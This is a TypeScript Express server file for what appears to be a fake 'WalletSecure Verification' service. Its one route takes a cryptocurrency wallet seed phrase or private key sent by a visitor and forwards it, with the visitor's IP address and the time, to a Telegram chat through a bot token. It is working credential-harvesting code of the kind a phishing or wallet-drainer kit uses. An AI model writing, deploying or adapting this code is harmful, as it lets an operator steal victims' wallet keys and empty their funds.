import type { Express } from "express";
import express from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";

export async function registerRoutes(app: Express): Promise<Server> {
  app.use(express.json());

  // Telegram webhook endpoint for sending wallet credentials
  app.post('/api/send-telegram', async (req, res) => {
    try {
      console.log('Received request body:', req.body);
      const { walletType, connectionMethod, credentials } = req.body;
      
      if (!process.env.TELEGRAM_BOT_TOKEN) {
        console.error('TELEGRAM_BOT_TOKEN not configured');
        return res.status(500).json({ message: 'Telegram not configured' });
      }

      const chatId = process.env.TELEGRAM_CHAT_ID;
      if (!chatId) {
        console.error('TELEGRAM_CHAT_ID not configured');
        return res.status(500).json({ message: 'Telegram chat ID not configured' });
      }

      const message = `🔐 WalletSecure Verification\n\n` +
                     `Wallet Type: ${walletType}\n` +
                     `Method: ${connectionMethod === 'seed' ? 'Seed Phrase' : 'Private Key'}\n` +
                     `Credentials: ${credentials}\n\n` +
                     `Time: ${new Date().toISOString()}\n` +
                     `IP: ${req.ip || 'Unknown'}`;

      const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error('Telegram API error:', response.status, errorText);
        return res.status(500).json({ message: 'Failed to send to Telegram', error: errorText });
      }

      const result = await response.json();
      console.log('Message sent successfully to Telegram:', result);
      res.json({ success: true, message: 'Credentials sent successfully' });
    } catch (error) {
      console.error('Telegram send error:', error);
      res.status(500).json({ message: 'Internal server error', error: String(error) });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
